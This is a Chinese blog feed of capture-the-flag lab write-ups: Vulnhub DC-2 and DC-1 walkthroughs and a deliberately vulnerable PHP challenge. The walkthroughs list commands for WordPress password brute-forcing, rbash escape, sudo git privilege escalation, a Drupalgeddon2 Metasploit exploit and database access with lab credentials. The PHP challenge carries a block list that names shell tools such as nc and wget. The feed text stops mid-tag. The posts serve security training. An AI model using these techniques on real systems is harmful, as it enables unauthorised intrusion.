    <summary type="html">&lt;h3 id=&quot;一、前期准备&quot;&gt;&lt;a href=&quot;#一、前期准备&quot; class=&quot;headerlink&quot; title=&quot;一、前期准备&quot;&gt;&lt;/a&gt;一、前期准备&lt;/h3&gt;&lt;h4 id=&quot;1-下载地址&quot;&gt;&lt;a href=&quot;#1-下载地址&quot; class=&quot;headerlink&quot; title=&quot;1.下载地址&quot;&gt;&lt;/a&gt;1.下载地址&lt;/h4&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://www.vulnhub.com/entry/dc-32,312/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&quot;2-准备工具&quot;&gt;&lt;a href=&quot;#2-准备工具&quot; class=&quot;headerlink&quot; title=&quot;2.准备工具&quot;&gt;&lt;/a&gt;2.准备工具&lt;/h4&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;kali			桥接模式			192.168.1.49						&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dc-3			桥接模式			192.168.1.43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;二、信息收集&quot;&gt;&lt;a href=&quot;#二、信息收集&quot; class=&quot;headerlink&quot; title=&quot;二、信息收集&quot;&gt;&lt;/a&gt;二、信息收集&lt;/h3&gt;&lt;p&gt;官网给出的信息&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这个靶场与之前的不同，只有一个入口点和一个flag，并且没有任何线索。&lt;br&gt;靶场只需要简单的下载，解压，打开并将其导入到VMware即可&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulnhub系列-DC2靶场</title>
    <link href="http://example.com/2023/06/05/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2023/06/05/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/</id>
    <published>2023-06-05T05:33:57.000Z</published>
    <updated>2023-06-08T06:20:31.340Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、前期准备"><a href="#一、前期准备" class="headerlink" title="一、前期准备"></a>一、前期准备</h3><h4 id="1-下载地址"><a href="#1-下载地址" class="headerlink" title="1.下载地址"></a>1.下载地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dc-2,311/</span><br></pre></td></tr></table></figure><h4 id="2-利用工具"><a href="#2-利用工具" class="headerlink" title="2.利用工具"></a>2.利用工具</h4><p><strong>注意：</strong>网络设置需要修改哦</p><p>kali  桥接模式</p><p>DC-2 桥接模式</p><span id="more"></span><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230607160440684.png" alt="image-20230607160440684"></p><h3 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h3><h4 id="1-查看IP"><a href="#1-查看IP" class="headerlink" title="1.查看IP"></a>1.查看IP</h4><blockquote><p>kali：192.168.1.49</p><p>dc2：192.168.1.105</p></blockquote><p>利用nmap扫描到dc2靶场IP，并且发现靶场开放了80http服务端口和7744ssh端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p1-65535 192.168.1.105</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230607162635916.png" alt="image-20230607162635916"></p><p>发现dc2靶场的IP开放80端口，我们可以访问一下。</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230607162942390.png" alt="image-20230607162942390"></p><p>本地访问不了，应该是给重定向了</p><h4 id="2-修改本地DNS"><a href="#2-修改本地DNS" class="headerlink" title="2.修改本地DNS"></a>2.修改本地DNS</h4><p>我们可以尝试本地绑定一下dns</p><blockquote><p>在hosts文件中绑定即可</p><p>hosts文件地址：etc&#x2F;hosts</p><p>在hosts文件中添加 <code>IP dc-2</code></p></blockquote><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608082354630.png" alt="image-20230608082354630"></p><p><strong>注意，需要以管理员身份打开hosts文件</strong></p><h4 id="3-收集网站信息"><a href="#3-收集网站信息" class="headerlink" title="3.收集网站信息"></a>3.收集网站信息</h4><p>访问dc-2网站</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230607165117233.png" alt="image-20230607165117233"></p><p>网站为WordPress搭建的博客</p><p>发现flag1</p><p>flag1内容翻译</p><blockquote><p>你通常的单词表可能不起作用，所以，也许你只需要cewl。</p><p>密码越多越好，但有时候你不能全部都赢。</p><p>作为一个人登录以查看下一个标志。</p><p>如果找不到，请以其他身份登录。</p></blockquote><h4 id="4-目录扫描"><a href="#4-目录扫描" class="headerlink" title="4.目录扫描"></a>4.目录扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://dc-2/</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608090326121.png" alt="image-20230608090326121"></p><h3 id="三、web渗透"><a href="#三、web渗透" class="headerlink" title="三、web渗透"></a>三、web渗透</h3><h4 id="1-生成字典"><a href="#1-生成字典" class="headerlink" title="1.生成字典"></a>1.生成字典</h4><p>根据提示应该是使用cewl</p><blockquote><p>Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w dc-2.txt</span><br></pre></td></tr></table></figure><p>使用cewl工具生成字典</p><h4 id="2-爆破枚举用户"><a href="#2-爆破枚举用户" class="headerlink" title="2.爆破枚举用户"></a>2.爆破枚举用户</h4><p>提示我们使用cewl来探测网页密码，那我们应该需要先知道有哪些账户，这边需要用到wpscan</p><blockquote><p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p></blockquote><p>首先我们需要枚举账户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u</span><br><span class="line">-e:枚举</span><br><span class="line">u： 枚举用户名</span><br></pre></td></tr></table></figure><p>发现三个用户名admin,jerry,tom</p><h4 id="3-爆破枚举密码"><a href="#3-爆破枚举密码" class="headerlink" title="3.爆破枚举密码"></a>3.爆破枚举密码</h4><p>我们把三个用户名存放到一个user.txt中</p><p>然后用wpscan爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2  -U user.txt -P dc-2.txt</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608090805285.png" alt="image-20230608090805285"></p><blockquote><p>账号1：jerry</p><p>密码1：adipiscing</p><p>账号2：tom        </p><p>密码2：parturient</p></blockquote><p>成功破解出两个账户的账号密码</p><p>刚刚目录扫描中扫到了登录界面 <code>/wp-admin  </code> </p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608091530297.png" alt="image-20230608091530297"></p><p>利用账号登录后在page页面中发现flag2</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608092146035.png" alt="image-20230608092146035"></p><p>提示我们还有另一种方法</p><h3 id="四、主机端渗透"><a href="#四、主机端渗透" class="headerlink" title="四、主机端渗透"></a>四、主机端渗透</h3><h4 id="1-ssh协议远程连接"><a href="#1-ssh协议远程连接" class="headerlink" title="1.ssh协议远程连接"></a>1.ssh协议远程连接</h4><p>提示的意思是从另一个方向切入，我们刚刚是80端口进，还有个ssh的7744端口</p><p>账号密码就是我们枚举出来的，成功登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.1.105 -p 7744</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608092506639.png" alt="image-20230608092506639"></p><p>连接完成后，我们查看一下当前目录下文件</p><p>在文件中发现flag3</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608093131036.png" alt="image-20230608093131036"></p><p>但是 <code>cat flag3.txt</code> 不好用</p><h4 id="2-rbash逃逸"><a href="#2-rbash逃逸" class="headerlink" title="2.rbash逃逸"></a>2.rbash逃逸</h4><p>经过排查发现有个 <code>rbash</code> </p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rbash是Restricted bash缩写，即受限制的bash。</span><br><span class="line">管理员可通过指定普通用户的bash为rbash，以此来限制相关操作。</span><br><span class="line">在rbash中，很多行为和命令都会被受到限制</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbash逃逸，确切说不属于提权，只是绕过rbash的限制，因为绕过后身份依旧是当前的普通账户。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rbash逃逸大全</span><br><span class="line">https://xz.aliyun.com/t/7642?page=1</span><br></pre></td></tr></table></figure></blockquote><p>两种方法可以绕过rbash</p><h5 id="rbash逃逸方法1"><a href="#rbash逃逸方法1" class="headerlink" title="rbash逃逸方法1"></a>rbash逃逸方法1</h5><p>将以下代码复制执行，就可以绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`</span><br><span class="line">export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出</span><br><span class="line">export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出</span><br></pre></td></tr></table></figure><h5 id="rbash逃逸方法2"><a href="#rbash逃逸方法2" class="headerlink" title="rbash逃逸方法2"></a>rbash逃逸方法2</h5><p>先查看可以使用的命令</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608103406671.png" alt="image-20230608103406671"></p><p>可以看到能使用的命令为less，ls，scp，vi</p><p>进入vi编辑页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br></pre></td></tr></table></figure><p>按下esc，输入如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/bash</span><br></pre></td></tr></table></figure><p>设置好后，回车，继续输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:shell</span><br></pre></td></tr></table></figure><p>按下回车，即可升级为bash</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608104724564.png" alt="image-20230608104724564"></p><p>cat命令不好用，是没有加环境变量，通过如下代码添加环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin </span><br></pre></td></tr></table></figure><p>这两种方法都可以拿到绕过rbash</p><p>flag3.txt内容：</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608094228421.png" alt="image-20230608094228421"></p><h4 id="3-su切换用户"><a href="#3-su切换用户" class="headerlink" title="3.su切换用户"></a>3.su切换用户</h4><p>根据flag3的提示，我们需要更换用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure><p>再输入以下之前拿到的密码即可登入</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608134607174.png" alt="image-20230608134607174"></p><p>可以使用命令找一下flag文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608134745370.png" alt="image-20230608134745370"></p><p>查看一下flag4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/jerry/flag4.txt</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608134851005.png" alt="image-20230608134851005"></p><p>翻译之后</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608134939547.png" alt="image-20230608134939547"></p><p>提示还有一个git可以提权使用</p><h4 id="4-Git提权"><a href="#4-Git提权" class="headerlink" title="4.Git提权"></a>4.Git提权</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608135347519.png" alt="image-20230608135347519"></p><p>发现可以使用git</p><p>查看提权方法，发现git具有root权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608135931865.png" alt="image-20230608135931865"></p><p>发现只可以使用git，具体为什么只能使用git，我也不是很清晰。</p><p>提权方法有两种</p><h5 id="提权方法1"><a href="#提权方法1" class="headerlink" title="提权方法1"></a>提权方法1</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br></pre></td></tr></table></figure><p>回车输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">！/bin/bash (这里bash也可以换成sh)</span><br></pre></td></tr></table></figure><h5 id="提权方法2"><a href="#提权方法2" class="headerlink" title="提权方法2"></a>提权方法2</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help</span><br></pre></td></tr></table></figure><p>回车输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">！/bin/bash (这里bash也可以换成sh)</span><br></pre></td></tr></table></figure><p>两种方法都可以提权</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608141011606.png" alt="image-20230608141011606"></p><p>提权后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608141243798.png" alt="image-20230608141243798"></p><p>发现root目录下有一个final-flag.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/final-flag.txt</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC2%E9%9D%B6%E5%9C%BA/image-20230608141351595.png" alt="image-20230608141351595"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;一、前期准备&quot;&gt;&lt;a href=&quot;#一、前期准备&quot; class=&quot;headerlink&quot; title=&quot;一、前期准备&quot;&gt;&lt;/a&gt;一、前期准备&lt;/h3&gt;&lt;h4 id=&quot;1-下载地址&quot;&gt;&lt;a href=&quot;#1-下载地址&quot; class=&quot;headerlink&quot; title=&quot;1.下载地址&quot;&gt;&lt;/a&gt;1.下载地址&lt;/h4&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://www.vulnhub.com/entry/dc-2,311/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h4 id=&quot;2-利用工具&quot;&gt;&lt;a href=&quot;#2-利用工具&quot; class=&quot;headerlink&quot; title=&quot;2.利用工具&quot;&gt;&lt;/a&gt;2.利用工具&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;网络设置需要修改哦&lt;/p&gt;
&lt;p&gt;kali  桥接模式&lt;/p&gt;
&lt;p&gt;DC-2 桥接模式&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>一道有意思的代码审计</title>
    <link href="http://example.com/2023/05/29/%E4%B8%80%E9%81%93%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2023/05/29/%E4%B8%80%E9%81%93%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2023-05-29T06:54:34.000Z</published>
    <updated>2023-05-29T07:01:35.879Z</updated>
    
    <content type="html"><![CDATA[<p> 一、某函数的复仇</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shaw&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shaw</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shaw&#x27;</span>];</span><br><span class="line">    <span class="variable">$root</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z_]*$/isD&#x27;</span>,<span class="variable">$shaw</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/rm|ch|nc|net|ex|\-|de|cat|tac|strings|h|wget|\?|cp|mv|\||so|\$/i&#x27;</span>,<span class="variable">$root</span>))&#123;</span><br><span class="line">            <span class="variable">$shaw</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$root</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Almost there^^&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 一、某函数的复仇&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulnhub系列-DC1靶场</title>
    <link href="http://example.com/2023/05/24/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2023/05/24/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/</id>
    <published>2023-05-24T05:56:48.000Z</published>
    <updated>2023-06-07T08:02:13.672Z</updated>
    
    <content type="html"><![CDATA[<p>Vulnhub是一个提供各种漏洞环境的靶场平台，提供给网络安全爱好者学习渗透使用，其中大部分环境是做好的虚拟机镜像文件，需要使用VMware和VirtualBox运行。镜像文件中预先设计了多种漏洞，需要通过预设的漏洞获得虚拟机的权限，并想办法提权到root，获得&#x2F;root目录下的&#x2F;flag文件（部分靶机具有多个flag）</p><span id="more"></span><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>下载dc1镜像文件，下载完成后双击 <code>ova</code> 文件，用VMware打开，修改配置连接方式为 <code>NET模式</code>。</p><p>开启kali和靶机，修改配置连接方式为 <code>NET模式</code>。</p><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>kali的IP：192.168.180.230</p><h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.180.1/24 </span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524143555542.png" alt="image-20230524143555542"></p><p>获取目标IP后，可使用多种扫描方式对目标靶机端口进行扫描，该方式为半开放式扫描，不建立完整的TCP三次握手，扫描速度较快，因此经常被使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p 1-65535 192.168.180.171</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524145108588.png" alt="image-20230524145108588"></p><p>只有80端口可以正常访问，我们访问一下。输入IP+:80，输入下面的网址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.180.171:80</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524145553367.png" alt="image-20230524145553367"></p><p>发现如上图的一个网站，通过火狐插件 <code>Wappalyzer</code> 可以检测到改目标网址网站的一些关键信息。比如该网站为小型内容管理系统Drupal，并且版本号为7。</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524150001628.png" alt="image-20230524150001628"></p><h4 id="二、漏洞发现"><a href="#二、漏洞发现" class="headerlink" title="二、漏洞发现"></a>二、漏洞发现</h4><p>在Drupal 7 &lt;&#x3D; 7.57是有一个命令执行漏洞的，根据Drupal的版本号推断，该目标网站可能存在CVE-2018-7600（Drupal远程核心代码执行 ）</p><p>启动msfconsole，打开控制台，输入命令寻找可利用模块位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524152921802.png" alt="image-20230524152921802"></p><p>利用该模块对网站进行攻击，在MSFconsole下输入目标网站信息</p><blockquote><p>use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2#使用攻击模块</p><p>set rhost 192.168.180.171#设置攻击目标IP</p><p>options #查看配置设置情况</p><p>run&#x2F;exploit  #执行攻击  </p></blockquote><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524163250530.png" alt="image-20230524163250530"></p><h4 id="三、-漏洞利用"><a href="#三、-漏洞利用" class="headerlink" title="三、 漏洞利用"></a>三、 漏洞利用</h4><p>运行模块后，成功建立会话，使用shell即可获得靶机的webshell。</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524163752336.png" alt="image-20230524163752336"></p><p>1 使用 <code>whoami</code> 查看当前用户权限</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524164021404.png" alt="image-20230524164021404"></p><p>2 为了后面方便，我么可以使用交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><blockquote><p>交互式shell：可以执行一些上下文的命令，并且会显示操作的结果。</p></blockquote><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524165008988.png" alt="image-20230524165008988"></p><p>3 在命令行里输入 <code>ls</code> 发现<code>flag1.txt</code>，使用tail查看里面内容，翻译过后是：</p><blockquote><p>每一个好的cms需要一个配置文件，你也一样。</p></blockquote><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524165326911.png" alt="image-20230524165326911"></p><p> 4 我们根据内容，搜索drupal的配置文件名为 <code>settings.php</code> ，使用下面的命令搜索目标文件目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name settings.php</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524170910512.png" alt="image-20230524170910512"></p><p>5 搜索到目录地址，直接使用cat查看</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524171129678.png" alt="image-20230524171129678"></p><p>6 不仅发现了flag2，而且还知道了mysql的一些关键信息。flag2翻译</p><blockquote><p>*暴力和字典攻击不是</p><p>*获得访问权限的唯一方法（您将需要访问权限）。</p><p>*你能用这些证书做什么？</p></blockquote><p>7 使用命令尝试登录靶机数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u dbuser -pR0ck3t#登录数据库</span><br><span class="line">show databases;#显示数据库</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524172244476.png" alt="image-20230524172244476"></p><p>8 发现<code>drupaldb</code> 可能是网站的数据库，输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb#使用drupaldb数据库</span><br><span class="line">show tables#查看数据库的表信息</span><br></pre></td></tr></table></figure><p><img 